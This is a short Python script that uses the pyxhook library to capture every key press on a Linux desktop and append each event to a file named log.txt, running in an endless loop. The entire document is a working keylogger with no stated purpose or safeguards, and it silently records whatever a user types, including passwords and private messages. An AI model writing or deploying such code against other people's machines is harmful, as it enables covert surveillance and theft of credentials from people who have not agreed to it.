import pyxhook as hk
import time

def onKeyboardEvent(event):
	fl = open('log.txt', 'a+')
	st ='\n====================\n'
	st += str(event)
	st += '\n====================\n'
	fl.write(st)
	fl.close()

hm = hk.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
hm.start()

running = True

while running:
	time.sleep(0.1)

